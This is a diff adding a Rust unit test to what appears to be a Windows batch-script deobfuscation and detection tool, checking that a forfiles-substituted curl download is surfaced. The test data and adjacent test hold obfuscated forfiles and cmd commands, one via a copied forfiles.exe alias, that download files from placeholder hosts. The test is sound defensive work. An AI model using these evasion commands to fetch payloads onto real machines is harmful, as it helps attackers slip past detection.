@@ -18841,6 +18841,36 @@ mod child_tests {
     }
 
     #[test]
+    fn forfiles_placeholder_cmd_child_does_not_reexpand_into_wrapper() {
+        let script = br#"echo seed>payload.txt
+forfiles /m payload.txt /c "cmd /V:ON /c set U=https://forfiles-subst.example/@file&&curl -o @file !U!""#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst, .. }
+                        if src == "https://forfiles-subst.example/payload.txt"
+                            && dst.as_deref() == Some("payload.txt")
+                )
+            }),
+            "forfiles substituted child download not surfaced: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+        let repeats = report
+            .deobfuscated
+            .matches("https://forfiles-subst.example/payload.txt")
+            .count();
+        assert!(
+            repeats <= 3,
+            "forfiles substituted child re-expanded into wrapper {repeats} times:\n{}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
     fn copied_forfiles_alias_nested_cmd_surfaces_download_trait() {
         let script = br#"copy C:\Windows\System32\forfiles.exe C:\Users\Public\ff.tmp
 C:\Users\Public\ff.tmp /m *.txt /c "cmd /c curl -o out.exe https://copied-forfiles.example/p.exe""#;
